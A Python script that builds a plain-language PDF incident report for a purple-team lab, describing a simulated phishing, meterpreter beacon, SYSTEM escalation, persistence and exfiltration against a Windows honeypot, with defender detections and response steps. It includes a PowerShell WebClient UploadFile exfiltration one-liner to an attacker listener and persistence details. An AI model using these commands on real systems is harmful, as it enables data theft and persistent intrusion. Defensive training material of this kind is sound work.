#!/usr/bin/env python3
"""Build the Stage 2 incident report with a clean, readable layout."""
import os
from reportlab.lib import colors
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import ParagraphStyle
from reportlab.lib.units import mm
from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, Table,
                                TableStyle, PageBreak, HRFlowable)

OUT = r"C:\Users\style\lab\STAGE2_INCIDENT_REPORT.pdf"

# ---------- palette ----------
DARK = colors.HexColor("#1a2332")
ACCENT = colors.HexColor("#2563eb")
LIGHT = colors.HexColor("#eff3f8")
BORDER = colors.HexColor("#c9d4e0")
GREY = colors.HexColor("#5a6b7f")

# ---------- styles ----------
title_s = ParagraphStyle("T", fontName="Helvetica-Bold", fontSize=20, leading=26, textColor=DARK)
subtitle_s = ParagraphStyle("ST", fontName="Helvetica", fontSize=11, leading=15, textColor=GREY)
h1 = ParagraphStyle("H1", fontName="Helvetica-Bold", fontSize=14, leading=18, textColor=ACCENT,
                    spaceBefore=14, spaceAfter=6)
body = ParagraphStyle("B", fontName="Helvetica", fontSize=10, leading=15, textColor=DARK, spaceAfter=6)
body_small = ParagraphStyle("BS", fontName="Helvetica", fontSize=9, leading=12.5, textColor=DARK)
cell = ParagraphStyle("C", fontName="Helvetica", fontSize=8.5, leading=11.5, textColor=DARK)
cell_h = ParagraphStyle("CH", fontName="Helvetica-Bold", fontSize=8.5, leading=11.5, textColor=colors.white)
note_s = ParagraphStyle("N", fontName="Helvetica-Oblique", fontSize=9, leading=13, textColor=GREY,
                        spaceAfter=6, leftIndent=8)

PAGE_W = A4[0]
MARGIN = 18 * mm
CONTENT_W = PAGE_W - 2 * MARGIN

story = []

def P(text, style=body):
    story.append(Paragraph(text, style))

def H(text):
    story.append(Paragraph(text, h1))
    story.append(HRFlowable(width="100%", thickness=0.8, color=BORDER, spaceAfter=6))

def table(headers, rows, widths):
    data = [[Paragraph(h, cell_h) for h in headers]]
    for r in rows:
        data.append([Paragraph(str(c), cell) for c in r])
    t = Table(data, colWidths=widths, repeatRows=1)
    style = [
        ("BACKGROUND", (0, 0), (-1, 0), ACCENT),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("LEFTPADDING", (0, 0), (-1, -1), 5),
        ("RIGHTPADDING", (0, 0), (-1, -1), 5),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("LINEBELOW", (0, 0), (-1, 0), 0.8, ACCENT),
        ("LINEBELOW", (0, 1), (-1, -1), 0.4, BORDER),
    ]
    for i in range(1, len(data)):
        if i % 2 == 0:
            style.append(("BACKGROUND", (0, i), (-1, i), LIGHT))
    t.setStyle(TableStyle(style))
    story.append(t)
    story.append(Spacer(1, 8))

def note(text):
    story.append(Paragraph(text, note_s))

# ================= TITLE BLOCK =================
story.append(Spacer(1, 6))
P("Purple-Team Campaign Lab", title_s)
P("Incident Report &mdash; Stage 2 in plain language", subtitle_s)
story.append(Spacer(1, 4))
story.append(HRFlowable(width="100%", thickness=1.5, color=ACCENT, spaceAfter=8))
P("<b>Date:</b> 7 October 2026 &nbsp;&nbsp;|&nbsp;&nbsp; <b>Target:</b> HONEYPOT (Windows 11 24H2 VM) "
  "&nbsp;&nbsp;|&nbsp;&nbsp; <b>Type:</b> Controlled purple-team exercise", body_small)
story.append(Spacer(1, 4))

# ================= 1. SUMMARY =================
H("1. What happened, in one paragraph")
P("We ran a fake cyber-attack on a test computer (a honeypot VM) to practice catching real attacks. "
  "We pretended to be a hacker: we sent a fake invitation PDF, the victim clicked a link and got "
  "infected, we escalated to the highest Windows privilege (SYSTEM), made the infection survive "
  "reboots, and stole a file back to our side. Then, as the defender, we look at the logs "
  "(Sysmon + Elastic) and see every single step. This report explains each step in plain language, "
  "and shows what the defender's tools would have caught at every stage.")

# ================= 2. THE CAST =================
H("2. The cast &mdash; who and what is involved")
table(["Role", "What it is"],
      [["The victim", "HONEYPOT &mdash; a Windows 11 test VM (192.168.254.128). It runs Sysmon and an "
        "Elastic agent, so everything it does gets streamed to the SOC."],
       ["Hacker side (attack mode)", "Kali Linux (msfconsole) plus a small Windows relay program. All "
        "attack commands run from here."],
       ["Defender side (later)", "The Elastic SIEM at siem.example.com:9200 &mdash; where the victim's "
        "logs and alerts appear."],
       ["office_update.exe", "The malicious program (a 'beacon'). Fake name &mdash; looks like an Office "
        "update. Secretly phones home to the hacker."],
       ["wu_service.exe", "A copy of the beacon renamed to look like a Windows Update service, hidden in "
        "C:\\ProgramData\\WinUpdate."],
       ["C2 channel", "The secret phone line between beacon and hacker. Lab address: "
        "192.168.254.100 port 4443, bridged by the relay into Kali."]],
      [CONTENT_W * 0.26, CONTENT_W * 0.74])

story.append(PageBreak())

# ================= 3. STEP 1 =================
H("Step 1 &mdash; The phish (getting in the door)")
P("We made a PDF that looks like a real work invitation: <b>Year-End Showcase Invitation</b>. Inside is an "
  "RSVP link. The link is not a website &mdash; it downloads our malware disguised as "
  "<b>office_update.exe</b>. The victim opens the PDF, clicks RSVP, runs the downloaded file. That is how "
  "the attacker gets in. Real attackers do exactly this: a friendly-looking document, one click, infection.")
P("<b>Defender sees:</b> a browser connecting to an unusual IP (192.168.254.100:8080), an unknown .exe "
  "appearing in Downloads (Sysmon EID 11), and that exe being launched by explorer.exe (Sysmon EID 1).")

# ================= 4. STEP 2 =================
H("Step 2 &mdash; The beacon (the secret phone line)")
P("Once office_update.exe runs, it dials out to the hacker's server on port 4443. Key detail: the "
  "<b>victim makes the outgoing call</b>. That is why firewalls usually do not stop it &mdash; it looks "
  "like the computer is just browsing the internet, not like someone is breaking in. From that moment the "
  "hacker can type commands (shell, file operations) and the beacon obeys. That live connection is what we "
  "call a 'meterpreter session'.")
P("<b>Defender sees:</b> an unknown program opening an outbound TCP connection to non-standard port 4443 "
  "(Sysmon EID 3), plus Elastic rules that specifically flag meterpreter traffic.")

# ================= 5. STEP 3 =================
H("Step 3 &mdash; Escalation to SYSTEM (becoming the superuser)")
P("The beacon first ran as the normal user <b>honey</b>. A normal user cannot change machine-wide "
  "settings, so the hacker needs SYSTEM (the highest local privilege). We first tried a clever exploit "
  "(EfsPotato) &mdash; it reported success but did not stick, which is a realistic detail: exploits often "
  "flake. The path that actually worked had two parts:")
P("1.&nbsp; We made the user re-launch the beacon elevated. <b>honey</b> is a local admin, so a UAC popup "
  "appeared, the user clicked <b>Yes</b>, and the new process ran with high integrity &mdash; full admin "
  "powers unlocked.<br/>"
  "2.&nbsp; From there we <b>migrated</b> the beacon inside a system process (svchost.exe, PID 1372) &mdash; "
  "a Windows service host that runs as SYSTEM. 'Migrate' means the beacon moves its body into another "
  "process. After that, getuid showed <b>NT AUTHORITY\\SYSTEM</b>. Done.")
P("<b>Defender sees:</b> a UAC elevation event (Security log 4688), and process-injection-style events "
  "(Sysmon EID 8/10) when the beacon moved into svchost.exe. 'Unknown code injected into svchost' is a "
  "red flag for any analyst.")

story.append(PageBreak())

# ================= 6. STEP 4 =================
H("Step 4 &mdash; Persistence (coming back after reboot)")
P("A hacker who is 'inside' wants to stay inside. If the PC reboots, the office_update.exe in Downloads "
  "dies. So we planted <b>two</b> automatic restart triggers, both pointing at a hidden copy of the beacon "
  "(C:\\ProgramData\\WinUpdate\\wu_service.exe):")
table(["Trigger", "When it fires", "Why we did it"],
      [["Scheduled task <b>WinUpdateSvc</b>", "Every time the PC boots, running as SYSTEM",
        "Works even if no user ever logs in."],
       ["HKLM Run key (registry value <b>WinUpdateSvc</b>)", "Every time any user logs on",
        "Backup trigger &mdash; if the task is deleted, this one still fires."]],
      [CONTENT_W * 0.34, CONTENT_W * 0.34, CONTENT_W * 0.32])
P("<b>And it was PROVEN, not just configured:</b> the VM rebooted while the user was at lunch, and a "
  "brand-new hacker session (session 31) appeared in msfconsole at <b>14:36:38 with zero user action</b>. "
  "The scheduled task did its job. That single fact is the smoking gun in any incident report: "
  "<i>'beacon reconnected automatically after reboot'</i>.")
P("<b>Defender sees:</b> a new file appearing in C:\\ProgramData (Sysmon EID 11), a scheduled task created "
  "(Security 4698), and a registry value written to the HKLM Run key (Sysmon EID 13, Security 4657). All "
  "three are classic persistence detections.")

# ================= 7. STEP 5 =================
H("Step 5 &mdash; Exfiltration (stealing the file)")
P("The target file was <b>C:\\Users\\honey\\OneDrive\\Documents\\secret.txt</b> (2,524 bytes &mdash; note "
  "the gotcha: Windows 11 redirects Documents into OneDrive, so the 'real' Documents folder was empty). "
  "From the beacon we ran a one-line PowerShell command that uploads the file over HTTP to a listener we "
  "ran on our (attacker) side:")
P("<font face='Courier' size=8.5>(New-Object Net.WebClient).UploadFile('http://192.168.254.100:4444', "
  "'...secret.txt')</font>", note_s)
P("The file landed on the attacker machine intact &mdash; we read it back and it matched the original "
  "(a 5-anime list, 2,524 bytes).")
P("Two details worth highlighting for the report: (1) the exfil went to port <b>4444</b>, a "
  "<i>different</i> port than the C2 port 4443 &mdash; real attackers separate their 'command channel' from "
  "their 'data channel'; (2) 'New-Object Net.WebClient' + UploadFile is one of the most reliably detected "
  "exfiltration one-liners in the industry &mdash; a good Elastic rule flags it instantly.")
P("<b>Defender sees:</b> powershell.exe spawned by svchost.exe (odd parent-child, EID 1), an outbound HTTP "
  "connection to 192.168.254.100:4444 (EID 3), and the exfil one-liner itself in the command line.")

story.append(PageBreak())

# ================= 8. WHOLE STORY TABLE =================
H("The whole story in one table")
table(["#", "Phase", "Plain-English action", "Hacker TTP (MITRE ATT&amp;CK)", "What defender's logs show"],
      [["1", "Phish", "Fake invitation PDF; RSVP link downloads malware",
        "T1566.001 Spearphishing", "Link click; unknown exe downloaded (EID 3 + 11)"],
       ["2", "Execute", "Victim double-clicks office_update.exe",
        "T1204.002 User execution", "Exe launched by explorer (EID 1)"],
       ["3", "C2", "Beacon dials hacker server, port 4443",
        "T1095 Non-standard port", "Outbound TCP 4443 (EID 3); meterpreter alerts"],
       ["4", "Escalate", "UAC 'Yes' + migrate into svchost = SYSTEM",
        "T1548.002 UAC bypass, T1134 token", "Elevation event; injection into svchost (EID 8/10)"],
       ["5", "Persist", "Scheduled task + HKLM Run key; hidden copy in ProgramData",
        "T1053.005, T1547.001", "Task created (4698); Run key set (EID 13); file drop (EID 11)"],
       ["6", "Persist proof", "VM reboots at lunch; session 31 re-opens by itself at 14:36:38",
        "(same as above, now confirmed)", "New C2 connection from a boot-time process"],
       ["7", "Exfil", "PowerShell one-liner uploads secret.txt to port 4444",
        "T1041 Exfil over C2 channel", "WebClient UploadFile + outbound 4444 (EID 1 + 3)"]],
      [CONTENT_W * 0.05, CONTENT_W * 0.14, CONTENT_W * 0.31, CONTENT_W * 0.24, CONTENT_W * 0.26])

# ================= 9. LESSONS =================
H("Lessons we learned live (the fun part)")
P("<b>1. Exploits flake.</b> EfsPotato 'succeeded' but the token kept reverting &mdash; real attackers retry "
  "or switch technique, which is exactly what we did.<br/>"
  "<b>2. UAC is the wall.</b> A local admin at medium integrity cannot write HKLM; one 'Yes' click on UAC "
  "changed everything.<br/>"
  "<b>3. Persistence is the point.</b> The reboot-during-lunch moment, where our session re-appeared on its "
  "own, is the most satisfying five seconds of the whole lab.<br/>"
  "<b>4. Windows 11 gotcha.</b> Documents is redirected into OneDrive &mdash; affects both the attacker "
  "hunting files and the defender hunting evidence.<br/>"
  "<b>5. Session hygiene.</b> Closing the old meterpreter session killed the underlying beacon and caused a "
  "confusing zombie session. Rule: confirm the <i>new</i> session works <i>before</i> exiting the old one.")

# ================= 10. RESPONSE =================
H("What a defender should do (response, from the logs)")
P("<b>1. Kill the C2:</b> block 192.168.254.100 at the network (ports 8080 / 4443 / 4444).<br/>"
  "<b>2. Remove persistence:</b> delete scheduled task WinUpdateSvc, delete the HKLM Run value, delete "
  "C:\\ProgramData\\WinUpdate\\.<br/>"
  "<b>3. Kill the process:</b> terminate any wu_service.exe / office_update.exe.<br/>"
  "<b>4. Reset:</b> change honey's password (credentials may be targeted); review other hosts for the same "
  "C2 IP.<br/>"
  "<b>5. Hunt:</b> search the whole estate for network events to 192.168.254.100 and for the file names, to "
  "check if any other machine got phished.<br/>"
  "<b>6. Report:</b> this is where this document goes &mdash; attacker TTPs, timeline, evidence, "
  "containment steps.")

# ================= 11. APPENDIX =================
H("Appendix &mdash; lab environment facts")
table(["Item", "Value"],
      [["Victim", "HONEYPOT, Windows 11 24H2 (build 26200), x64, WORKGROUP, 192.168.254.128 (VMware NAT, "
        "gateway .2)"],
       ["Attacker", "Kali in WSL2 (msfconsole handler 127.0.0.1:4445) + native Windows relay at "
        "192.168.254.100 (HTTP 8080, relay 4443)"],
       ["SIEM", "Elastic 9.4.5 at siem.example.com:9200; Sysmon + Elastic agent on victim; alerts in "
        ".internal.alerts-security.*; raw logs in logs-* / .ds-logs-*"],
       ["Payload", "windows/x64/meterpreter_reverse_tcp, built with msfvenom -f exe"],
       ["Priv-esc path used", "UAC elevation (Start-Process -Verb RunAs) + process migration into svchost "
        "PID 1372"],
       ["Persistence", "Scheduled task WinUpdateSvc (onstart, SYSTEM) + HKLM Run value WinUpdateSvc; beacon "
        "staged at C:\\ProgramData\\WinUpdate\\wu_service.exe"],
       ["Exfil", "PowerShell WebClient UploadFile to 192.168.254.100:4444; file recovered at "
        "C:\\Users\\style\\lab\\exfil\\secret.txt (original 2,524 bytes verified intact)"],
       ["Note", "Defender real-time protection was disabled for the exercise; this was a controlled lab, "
        "no real-world targets"]],
      [CONTENT_W * 0.22, CONTENT_W * 0.78])

# ---------- footer with page numbers ----------
def footer(canvas, doc):
    canvas.saveState()
    canvas.setFont("Helvetica", 8)
    canvas.setFillColor(GREY)
    canvas.drawString(MARGIN, 10 * mm, "Purple-Team Lab &mdash; Stage 2 Incident Report".replace("&mdash;", "-"))
    canvas.drawRightString(PAGE_W - MARGIN, 10 * mm, f"Page {doc.page}")
    canvas.setStrokeColor(BORDER)
    canvas.line(MARGIN, 13 * mm, PAGE_W - MARGIN, 13 * mm)
    canvas.restoreState()

doc = SimpleDocTemplate(OUT, pagesize=A4,
                        leftMargin=MARGIN, rightMargin=MARGIN,
                        topMargin=16 * mm, bottomMargin=18 * mm,
                        title="Purple-Team Lab - Stage 2 Incident Report (Plain Language)",
                        author="CyberSec Purple-Team Lab")
doc.build(story, onFirstPage=footer, onLaterPages=footer)
print("OK", os.path.getsize(OUT), "bytes")
